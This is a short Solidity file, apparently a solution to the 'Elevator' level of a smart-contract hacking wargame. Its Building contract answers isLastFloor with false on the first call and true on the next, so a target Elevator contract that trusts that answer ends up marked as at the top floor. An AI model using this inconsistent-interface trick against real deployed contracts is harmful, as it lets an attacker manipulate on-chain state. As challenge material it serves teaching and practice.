pragma solidity ^0.4.18;

contract Elevator {
    function goTo(uint _floor) public;
}

contract Building {
    bool private cheat;
    
    constructor() public {
        cheat = false;
    }
    
    function isLastFloor(uint) public returns (bool) {
        if (!cheat) {
            cheat = true;
            return false;
        }
        return true;
    }
  
    function trigger(address _elevator) public {
        Elevator el = Elevator(_elevator);
        el.goTo(5);
    }
}
